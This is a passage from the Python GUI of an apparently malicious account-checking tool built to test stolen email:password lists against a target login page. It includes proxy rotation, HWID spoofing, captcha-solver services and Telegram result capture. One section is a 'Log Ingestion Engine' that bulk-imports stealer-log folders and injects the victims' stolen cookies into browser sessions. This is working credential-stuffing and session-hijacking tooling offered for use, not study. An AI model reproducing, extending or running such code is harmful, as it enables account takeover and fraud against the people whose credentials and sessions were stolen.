        if entropy_canvas.winfo_exists():
            entropy_canvas.delete("all")
            score = calculate_uniqueness_score()
            color = "#00adb5" if score > 85 else "#f39c12"
            entropy_canvas.create_text(150, 30, text=f"Uniqueness Score: {score}%", fill=color, font=("Consolas", 10, "bold"))
            # Re-trigger loop
            entropy_canvas.after(2000, update_entropy_graph)
    except Exception:
        pass

# Start the loop without blocking
update_entropy_graph()

# --- Stealth: Proxy List Path ---
ttk.Label(frame_stealth, text="Proxy List File:").grid(
    column=0, row=7, padx=10, pady=(15, 5), sticky="e"
)
entry_proxy_list_path = ttk.Entry(frame_stealth, width=40, textvariable=var_proxy_list_path)
entry_proxy_list_path.grid(column=1, row=7, padx=(10, 2), pady=(15, 5), sticky="w")
CreateToolTip(entry_proxy_list_path, "Path to a newline-separated list of proxies (host:port or user:pass@host:port).")

def browse_proxy_list():
    """Opens file dialog and loads selected proxy file into the global proxies list."""
    fpath = filedialog.askopenfilename(
        title="Select Proxy List File",
        filetypes=(("Text files", "*.txt"), ("All files", "*.*")),
        initialdir=os.getcwd(),
    )
    if fpath:
        var_proxy_list_path.set(fpath)
        try:
            global proxies
            with open(fpath, "r", encoding="utf-8") as pf:
                loaded = [line.strip() for line in pf if line.strip()]
            proxies = loaded
            print_action(f"{Fore.GREEN}[Stealth] Loaded {len(proxies)} proxies from {fpath}{Style.RESET_ALL}")
        except Exception as e:
            messagebox.showerror("Proxy Load Error", f"Failed to load proxies: {e}")

ttk.Button(frame_stealth, text="Browse...", command=browse_proxy_list).grid(
    column=2, row=7, padx=(2, 10), pady=(15, 5), sticky="w"
)

# --- Third-Party Captcha Solvers ---
frame_captcha_solvers = ttk.LabelFrame(frame_stealth, text="Third-Party Captcha Solvers (Optional)")
frame_captcha_solvers.grid(column=0, row=10, columnspan=4, padx=10, pady=10, sticky="ew")

ttk.Label(frame_captcha_solvers, text="Service:").grid(column=0, row=0, padx=10, pady=5, sticky="e")
ttk.OptionMenu(frame_captcha_solvers, var_captcha_service, "capsolver", "capsolver", "2captcha", "anticaptcha").grid(column=1, row=0, padx=10, pady=5, sticky="w")

ttk.Label(frame_captcha_solvers, text="API Key:").grid(column=2, row=0, padx=10, pady=5, sticky="e")
ttk.Entry(frame_captcha_solvers, width=40, textvariable=var_captcha_api_key).grid(column=3, row=0, padx=10, pady=5, sticky="w")


# --- Stealth: Cookie List Path ---
ttk.Label(frame_stealth, text="Cookie List File:").grid(
    column=0, row=8, padx=10, pady=5, sticky="e"
)
entry_cookie_list_path = ttk.Entry(frame_stealth, width=40, textvariable=var_cookie_list_path)
entry_cookie_list_path.grid(column=1, row=8, padx=(10, 2), pady=5, sticky="w")
CreateToolTip(entry_cookie_list_path, "Path to a JSON file with tracking cookies to inject via CDP before navigation. Format: [{name, value, domain, path}]")

def browse_cookie_list():
    """Opens file dialog for cookie JSON file."""
    fpath = filedialog.askopenfilename(
        title="Select Cookie JSON File",
        filetypes=(("JSON files", "*.json"), ("All files", "*.*")),
        initialdir=os.getcwd(),
    )
    if fpath:
        var_cookie_list_path.set(fpath)
        try:
            with open(fpath, "r", encoding="utf-8") as cf:
                cookie_data = json.load(cf)
            if not isinstance(cookie_data, list):
                raise ValueError("Cookie file must be a JSON array.")
            print_action(f"{Fore.GREEN}[Stealth] Cookie file validated: {len(cookie_data)} entries from {fpath}{Style.RESET_ALL}")
        except Exception as e:
            messagebox.showerror("Cookie Load Error", f"Failed to validate cookie file: {e}")

ttk.Button(frame_stealth, text="Browse...", command=browse_cookie_list).grid(
    column=2, row=8, padx=(2, 10), pady=5, sticky="w"
)

# --- Automated Log Ingestion Engine Section ---
ttk.Separator(frame_stealth, orient="horizontal").grid(
    column=0, row=9, columnspan=3, padx=10, pady=(15, 5), sticky="ew"
)

ttk.Label(
    frame_stealth,
    text="── Automated Log Ingestion Engine ──",
    foreground="#00adb5",
    font=("Inter", 10, "bold"),
).grid(column=0, row=10, columnspan=3, padx=10, pady=(5, 8), sticky="w")

chk_log_ingestion = ttk.Checkbutton(
    frame_stealth,
    text="Enable Automated Log Ingestion (per-account cookie injection from scanned logs folder)",
    variable=var_log_ingestion_enabled,
)
chk_log_ingestion.grid(column=0, row=11, columnspan=3, padx=10, pady=3, sticky="w")
CreateToolTip(
    chk_log_ingestion,
    "When enabled, each account's cookie file is resolved from the database (populated via Bulk Import).\n"
    "Overrides the global Cookie List File above on a per-account basis.\n"
    "Accounts without a paired cookie fall back to the global cookie file.",
)

chk_log_isolate = ttk.Checkbutton(
    frame_stealth,
    text="Auto-enable Session Isolation when Log Ingestion mode is active",
    variable=var_log_ingestion_isolate,
)
chk_log_isolate.grid(column=0, row=12, columnspan=3, padx=10, pady=3, sticky="w")
CreateToolTip(
    chk_log_isolate,
    "Automatically forces 'Enable Isolated Sessions' on for every account when Log Ingestion mode\n"
    "is active, ensuring per-account cookie isolation even if the checkbox above is unchecked.",
)

btn_bulk_import_logs = ttk.Button(
    frame_stealth,
    text="📁  Bulk Import from Logs Folder...",
    command=gui_bulk_import_logs,
)
btn_bulk_import_logs.grid(column=0, row=13, columnspan=2, padx=10, pady=(8, 3), sticky="w")
CreateToolTip(
    btn_bulk_import_logs,
    "Recursively scan an unzipped stealer-logs root folder.\n"
    "Pairs each Passwords.txt with its sibling Cookies.json and bulk-inserts\n"
    "all credential+cookie mappings into the database.\n\n"
    "Expected folder structure:\n"
    "  logs_root/\n"
    "  └── account_001/\n"
    "      ├── Passwords.txt   (one email:password per line)\n"
    "      └── Cookies.json    (JSON array with name/value/domain)",
)

lbl_ingestion_status = ttk.Label(
    frame_stealth,
    text="📋 No scan performed yet. Use 'Bulk Import' to populate the database.",
    foreground="gray",
)
lbl_ingestion_status.grid(column=0, row=14, columnspan=3, padx=10, pady=(3, 15), sticky="w")

# --- Janus Pre-flight Status Label ---
label_janus_status = ttk.Label(frame_stealth, text="⏳ Janus: Awaiting API key for model validation...", foreground="gray")
label_janus_status.grid(column=0, row=15, columnspan=3, padx=10, pady=(5, 15), sticky="w")


def run_janus_preflight(keys_raw):
    """Runs model pre-flight validation in background. Receives keys_raw as a string
    argument (captured on the main thread) to avoid accessing Tkinter StringVar off-thread."""
    if not keys_raw:
        try:
            window.after(0, lambda: label_janus_status.configure(
                text="⚠️ Janus: No API keys set - Enter OpenRouter API key(s) above.", foreground="orange"
            ))
        except Exception:
            pass
        return
    try:
        keys = [k.strip() for k in keys_raw.split(",") if k.strip()]
        client = OpenRouterClient(api_keys=keys)
        confirmed_model = client.janus_preflight_validate_sync()
        captured_model = confirmed_model
        def _update_confirmed():
            try:
                all_models = list(combo_openrouter_model['values'])
                if captured_model not in all_models:
                    combo_openrouter_model['values'] = [captured_model] + all_models
                var_openrouter_model.set(captured_model)
                label_janus_status.configure(
                    text=f"✅ Janus: Confirmed live model → {captured_model}", foreground="#00adb5"
                )
            except tk.TclError:
                pass
        try:
            window.after(0, _update_confirmed)
        except Exception:
            pass
    except Exception as e:
        captured_err = str(e)
        def _update_failed():
            try:
                label_janus_status.configure(
                    text=f"❌ Janus: Pre-flight failed - {captured_err}", foreground="red"
                )
            except tk.TclError:
                pass
        try:
            window.after(0, _update_failed)
        except Exception:
            print(f"[Janus] Pre-flight failed: {captured_err}")

def on_api_keys_changed(*args):
    # Snapshot the StringVar value on the main thread before spawning background thread
    try:
        keys_snapshot = var_openrouter_keys.get().strip()
    except Exception:
        keys_snapshot = ""
    threading.Thread(target=run_janus_preflight, args=(keys_snapshot,), daemon=True).start()

var_openrouter_keys.trace_add("write", on_api_keys_changed)


frame_config = ttk.Frame(notebook)
notebook.add(frame_config, text="Configuration Menu")

ttk.Button(
    frame_config,
    text="Create New Config",
    command=create_config,
).grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button"], "Create a new configuration file.")

ttk.Button(
    frame_config,
    text="Import Config",
    command=import_config,
).grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button2"], "Import an existing configuration file.")

ttk.Button(
    frame_config,
    text="Export Config",
    command=export_config,
).grid(column=0, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button3"], "Export the current configuration to a file.")

ttk.Button(
    frame_config,
    text="Export DB to CSV",
    command=export_db_to_csv,
).grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button4"], "Export validation database to CSV.")

ttk.Button(
    frame_config,
    text="Save Config State",
    command=save_config_state,
).grid(column=0, row=4, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button5"], "Save the current configuration state.")

ttk.Button(
    frame_config,
    text="Reset to Default",
    command=reset_to_default,
).grid(column=0, row=5, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_config.children["!button6"], "Reset all settings to their default values."
)

# -------------------
# Account Inputs and Actions
# -------------------
# Account Inputs section - anchored to row 1, NEVER expands so it is always on screen
frame_actions = ttk.LabelFrame(outer_frame, text="Account Inputs")
frame_actions.grid(row=1, column=0, padx=20, pady=(5, 10), sticky="ew")

ttk.Label(
    frame_actions,
    text="Enter Usernames and Passwords (one per line, format: email:password):",
    foreground=colors["fg_sub"]
).pack(padx=10, pady=(10, 5), anchor="w")

text_usernames_passwords = tk.Text(frame_actions, height=10, width=150, 
                                   bg=colors["surface"], fg=colors["fg"], 
                                   insertbackground=colors["accent"],
                                   font=("Consolas", 10), undo=True)
text_usernames_passwords.pack(padx=10, pady=5, fill="both", expand=True)

# Control Buttons Frame
frame_control_buttons = ttk.Frame(frame_actions)
frame_control_buttons.pack(padx=10, pady=10, anchor="e")

# Pause/Resume Button
btn_pause_resume = ttk.Button(
    frame_control_buttons, text="Pause", command=pause_resume
)
btn_pause_resume.grid(column=0, row=0, padx=5, pady=5)
CreateToolTip(
    btn_pause_resume,
    "Pause to Enter CONFIG Mode or resume the account checking process.",
)

# Force Stop Button
btn_force_stop = ttk.Button(
    frame_control_buttons,
    text="Force Stop",
    command=force_stop,
    state=tk.DISABLED,
)
btn_force_stop.grid(column=1, row=0, padx=5, pady=5)
CreateToolTip(
    btn_force_stop, "Forcefully STOP the ENTIRE account checking process."
)

# Check Accounts Button
btn_check_accounts = ttk.Button(
    frame_actions, text="Check Accounts", command=gui_check_accounts
)
btn_check_accounts.pack(padx=10, pady=10, anchor="e")
CreateToolTip(btn_check_accounts, "Start checking the entered accounts.")

# =============================================================================
# AUTO-SAVE SYSTEM
# Debounced: waits 1.5 seconds after the LAST change before writing settings.
# This prevents excessive disk writes while the user is still typing, while
# guaranteeing state is persisted even if the process is forcefully killed.
# =============================================================================
_auto_save_timer_id = None


def _schedule_auto_save(*args):
    """Called by tkinter variable traces. Debounces the actual save by 1.5s."""
    global _auto_save_timer_id
    try:
        if _auto_save_timer_id is not None:
            try:
                window.after_cancel(_auto_save_timer_id)
            except Exception:
                pass
        _auto_save_timer_id = window.after(1500, _perform_auto_save)
    except Exception:
        pass  # Never crash the main thread due to auto-save


def _perform_auto_save():
    """Runs the actual json dump on the main thread after the debounce window."""
    global _auto_save_timer_id
    _auto_save_timer_id = None
    try:
        save_settings()
    except Exception as _autosave_err:
        # Log the error so save failures are visible instead of silently lost
        try:
            print_action(f"{Fore.RED}[AutoSave] Failed to save settings: {_autosave_err}{Style.RESET_ALL}")
        except Exception:
            pass  # Never crash the main thread


# --- Attach traces to ALL persistent BooleanVars ---
_bool_autosave_vars = [
    var_inner_html_capture, var_outer_html_capture, var_cleanup_enabled,
    var_telegram_enabled, var_proxy_enabled, var_load_extensions,
    var_disable_notifications, var_disable_infobars, var_start_maximized,
    var_disable_extensions_option, var_headless, var_custom_user_agents,
    var_enable_mouse_clicks, var_incognito_mode, var_invalid_account_enabled,
    var_captcha_wrong_enabled, var_use_database, var_capture_screenshot,
    var_use_same_session, var_reinstall, var_jitter, var_isolation, var_hwid_spoof,
    var_developer_mode,
    # Log Ingestion per-account cookie feature - MUST be persisted so settings
    # survive app restarts and the feature does not silently disable itself.
    var_log_ingestion_enabled, var_log_ingestion_isolate,
]
for _autosave_var in _bool_autosave_vars:
    try:
        _autosave_var.trace_add("write", _schedule_auto_save)
    except Exception:
        pass

# --- Attach traces to ALL persistent StringVars ---
_str_autosave_vars = [
    capture_telegram_bot_token, capture_telegram_chat_id,
    var_openrouter_keys, var_openrouter_model,
    var_proxy_list_path, var_cookie_list_path,
]
for _autosave_var in _str_autosave_vars:
    try:
        _autosave_var.trace_add("write", _schedule_auto_save)
    except Exception:
        pass

# --- Attach auto-save to ALL Entry widgets and Text widgets ---
# The BooleanVar/StringVar traces above only cover checkboxes and a few
# text variables. Entry widgets (website_target_link, CSS selectors,
# invalid/captcha fields, accounts text, etc.) use raw .get() and are
# NOT backed by StringVars. They MUST have <KeyRelease> bindings so
# typing in them triggers a debounced auto-save.
_entry_autosave_names = [
    "entry_website_target_link", "entry_website_valid_link",
    "entry_redirect_link",
    "entry_css_selector_email", "entry_css_selector_password",
    "entry_css_selector_submit",
    "entry_css_selector_next_button", "entry_css_selector_next_button_password",
    "entry_sleep_email", "entry_sleep_password", "entry_sleep_submit",
    "entry_invalid_redirect", "entry_invalid_error_selector",
    "entry_invalid_inner_html", "entry_invalid_outer_html",
    "entry_captcha_redirect", "entry_captcha_error_selector",
    "entry_captcha_inner_html", "entry_captcha_outer_html",
]
for _ename in _entry_autosave_names:
    try:
        _ewidget = globals().get(_ename)
        if _ewidget is not None and hasattr(_ewidget, "bind"):
            _ewidget.bind("<KeyRelease>", lambda e: _schedule_auto_save())
            _ewidget.bind("<FocusOut>", lambda e: _schedule_auto_save())
    except Exception:
        pass

# Also bind the accounts Text widget (multi-line text area)
try:
    text_usernames_passwords.bind("<KeyRelease>", lambda e: _schedule_auto_save())
    text_usernames_passwords.bind("<FocusOut>", lambda e: _schedule_auto_save())
except Exception:
    pass

# =============================================================================
# FUTURISTIC DRAGGABLE TERMINAL LOG SCREEN
# =============================================================================
class DraggableTerminal(tk.Frame):
    def __init__(self, parent, initial_width=550, initial_height=500, *args, **kwargs):
        super().__init__(parent, bg="#0A0A0A", highlightbackground="#00adb5", highlightcolor="#00adb5", highlightthickness=2, *args, **kwargs)
        self.initial_width = initial_width
        self.initial_height = initial_height
        
        # Thread-safe queue for background logging
        import queue
        self.log_queue = queue.Queue()
        
        # Title bar
        self.title_bar = tk.Frame(self, bg="#111111", relief="flat")
        self.title_bar.pack(side="top", fill="x")
        
        # Title label
        self.title_label = tk.Label(self.title_bar, text="❖ SYSTEM TERMINAL // LIVE FEED", bg="#111111", fg="#00adb5", font=("Consolas", 10, "bold"))
        self.title_label.pack(side="left", padx=10, pady=5)
        
        # Control Buttons
        self.btn_clear = tk.Button(self.title_bar, text="CLEAR", bg="#222222", fg="#ffffff", relief="flat", font=("Consolas", 8), command=self.clear_logs)
        self.btn_clear.pack(side="right", padx=5)
        
        self.btn_toggle = tk.Button(self.title_bar, text="-", bg="#222222", fg="#ffffff", relief="flat", font=("Consolas", 8), command=self.toggle_minimize)
        self.btn_toggle.pack(side="right", padx=5)
        
        # Text Widget
        self.text_frame = tk.Frame(self, bg="#0A0A0A")
        self.text_frame.pack(side="bottom", fill="both", expand=True, padx=2, pady=2)
        
        self.scrollbar = ttk.Scrollbar(self.text_frame)
        self.scrollbar.pack(side="right", fill="y")
        
        self.log_text = tk.Text(self.text_frame, bg="#0A0A0A", fg="#00FF41", font=("Consolas", 9), 
                                yscrollcommand=self.scrollbar.set, wrap="word", state="disabled", bd=0, highlightthickness=0)
        self.log_text.pack(side="left", fill="both", expand=True)
        self.scrollbar.config(command=self.log_text.yview)
        
        # Define ANSI Color Tags
        self.log_text.tag_config("black", foreground="#000000")
        self.log_text.tag_config("red", foreground="#FF3B30")
        self.log_text.tag_config("green", foreground="#00FF41")
        self.log_text.tag_config("yellow", foreground="#FFCC00")
        self.log_text.tag_config("blue", foreground="#00A2FF")
        self.log_text.tag_config("magenta", foreground="#FF29FF")
        self.log_text.tag_config("cyan", foreground="#00adb5")
        self.log_text.tag_config("white", foreground="#FFFFFF")
        
        self.ansi_map = {
            "30": "black", "31": "red", "32": "green", "33": "yellow",
            "34": "blue", "35": "magenta", "36": "cyan", "37": "white",
            "90": "black", "91": "red", "92": "green", "93": "yellow",
            "94": "blue", "95": "magenta", "96": "cyan", "97": "white"
        }
        
        # Drag mechanics
        self.title_bar.bind("<ButtonPress-1>", self.start_drag)
        self.title_label.bind("<ButtonPress-1>", self.start_drag)
        self.title_bar.bind("<B1-Motion>", self.do_drag)
        self.title_label.bind("<B1-Motion>", self.do_drag)
        
        self.drag_data = {"x": 0, "y": 0}
        self.is_minimized = False
        
        self.ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        self.ansi_color = re.compile(r'\x1B\[(\d+)m')
        
        # Start periodic log queue checker
        self.check_queue()

    def start_drag(self, event):
        self.drag_data["x"] = event.x
        self.drag_data["y"] = event.y

    def do_drag(self, event):
        x = self.winfo_x() - self.drag_data["x"] + event.x
        y = self.winfo_y() - self.drag_data["y"] + event.y
        self.place(x=x, y=y)
        
    def toggle_minimize(self):
        if self.is_minimized:
            self.text_frame.pack(side="bottom", fill="both", expand=True, padx=2, pady=2)
            self.btn_toggle.config(text="-")
            self.place(height=self.initial_height)
            self.is_minimized = False
        else:
            self.text_frame.pack_forget()
            self.btn_toggle.config(text="+")
            self.place(height=35)
            self.is_minimized = True

    def clear_logs(self):
        self.log_text.config(state="normal")
        self.log_text.delete("1.0", tk.END)
        self.log_text.config(state="disabled")

    def check_queue(self):
        """Processes pending logs from the queue in the main thread."""
        import queue
        try:
            while True:
                text = self.log_queue.get_nowait()
                self._append_text(text)
        except queue.Empty:
            pass
        finally:
            try:
                self.after(50, self.check_queue)
            except Exception:
                pass

    def _append_text(self, text):
        self.log_text.config(state="normal")
        parts = re.split(r'(\x1B\[\d+m|\x1B\[0m)', text)
        current_tag = None
        for part in parts:
            if not part:
                continue
            if part.startswith('\x1B['):
                match = self.ansi_color.search(part)
                if match:
                    code = match.group(1)
                    if code == "0":
                        current_tag = None
                    elif code in self.ansi_map:
                        current_tag = self.ansi_map[code]
            else:
                clean_text = self.ansi_escape.sub('', part)
                if clean_text:
                    if current_tag:
                        self.log_text.insert(tk.END, clean_text, current_tag)
                    else:
                        self.log_text.insert(tk.END, clean_text)
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def write_log(self, text):
        self.log_queue.put(text)

class TerminalRedirector:
    def __init__(self, original_stream, terminal_widget):
        self.original_stream = original_stream
        self.terminal_widget = terminal_widget

    def write(self, text):
        try:
            self.original_stream.write(text)
            self.original_stream.flush()
        except Exception:
            pass
        if self.terminal_widget:
            self.terminal_widget.write_log(text)

    def flush(self):
        try:
            self.original_stream.flush()
        except Exception:
            pass

# ── Cookie Manager Integration block moved inside main to avoid import-time hangs ──


def _startup_ui_phase():
    """
    Phase 2 (main thread): UI-dependent startup steps.
    Called via window.after(0, ...) once background subprocess work is done.
    """
    try:
        load_settings()
        window.update()
        select_profile()
        window.update()
        # Pass the GUI flag so SQLitePool is only initialised when enabled.
        setup_database(db_name, use_database=var_use_database.get())
        window.update()
    except Exception as e:
        print_action(f"{Fore.RED}Startup UI phase error: {e}{Style.RESET_ALL}")



def _startup_bg_thread():
    """
    Phase 1 (background thread): All blocking subprocess operations.
    Main thread stays in mainloop() so the window is responsive and
    window.after(0, _append) events from print_action() are processed in real time.
    """
    try:
        # ── Cookie Manager Integration ──
        try:
            import sqlite3 as _cm_sqlite3
            _cm_conn = _cm_sqlite3.connect(db_name)
            _cm_cur  = _cm_conn.cursor()
            _cm_cur.execute("PRAGMA table_info(accounts)")
            _cm_cols = [c[1] for c in _cm_cur.fetchall()]
            if "cookie_path" not in _cm_cols:
                _cm_cur.execute("ALTER TABLE accounts ADD COLUMN cookie_path TEXT DEFAULT NULL")
                _cm_conn.commit()
            _cm_conn.close()
        except Exception as _cm_e:
            print_action(f"{Fore.YELLOW}[Cookie Manager] Schema check skipped: {_cm_e}{Style.RESET_ALL}")

        check_python_version()

        required_packages = [
            "colorama",
            "selenium",
            "requests",
            "chromedriver-autoinstaller",
            "Pillow",
            "pyautogui",
        ]
        check_and_install_packages(required_packages)

        # Close any existing Chrome processes
        force_close_chrome_processes()

        # ── Pre-unpack all extensions ───────────────────────────────────────
        # Unpack CRX files during startup so they are fully available in
        # _ext_unpacked/ before any isolated session profile gets seeded.
        try:
            print_action(f"{Fore.CYAN}[Extensions] Pre-warming and unpacking extension payloads...{Style.RESET_ALL}")
            class MockOptions:
                def __init__(self):
                    self._arguments = []
                    self.arguments = []
                def add_extension(self, path):
                    pass
                def add_argument(self, arg):
                    pass
            load_chrome_extensions(MockOptions())
            print_action(f"{Fore.GREEN}[Extensions] Pre-warming completed.{Style.RESET_ALL}")
        except Exception as _pe:
            print_action(f"{Fore.YELLOW}[Extensions] Pre-warming skipped: {_pe}{Style.RESET_ALL}")

    except Exception as e:
        print_action(f"{Fore.RED}Startup background phase error: {e}{Style.RESET_ALL}")
    finally:
        # Hand off to main thread for UI operations
        try:
            window.after(0, _startup_ui_phase)
        except Exception:
            pass


if __name__ == "__main__":
    try:
        # Start the Automated Session Integrity & Cleanup Daemon
        cleanup_daemon_instance = CleanupDaemon()
        cleanup_daemon_instance.start()

        # Build and attach the terminal widget
        terminal_ui = DraggableTerminal(window, initial_width=550, initial_height=500)
        terminal_ui.place(x=800, y=60, width=550, height=500)

        # Redirect stdout/stderr to terminal widget (also writes to original stream)
        sys.stdout = TerminalRedirector(sys.stdout, terminal_ui)
        sys.stderr = TerminalRedirector(sys.stderr, terminal_ui)

        # Reveal the fully-built window — it was withdrawn during module construction.
        # Apply zoomed state HERE (not at module level) so it doesn't briefly un-withdraw
        # the window and flash a black screen on Python 3.13.
        window.state("zoomed")
        window.deiconify()
        window.lift()
        window.focus_force()
        window.protocol("WM_DELETE_WINDOW", on_closing)

        # Force a full render pass so the window is visibly painted before we begin.
        window.update()

        # Run all blocking subprocess work in a background thread.
        # The main thread stays in mainloop() → after(0, _append) events from
        # print_action() calls in the bg thread are processed in real time,
        # updating the DraggableTerminal widget as each step completes.
        threading.Thread(target=_startup_bg_thread, daemon=True).start()

        # Start the main GUI loop (never blocks — bg thread does the heavy lifting)
        window.mainloop()
    except Exception as e:
        print(f"Fatal startup error: {e}")
        sys.exit(1)
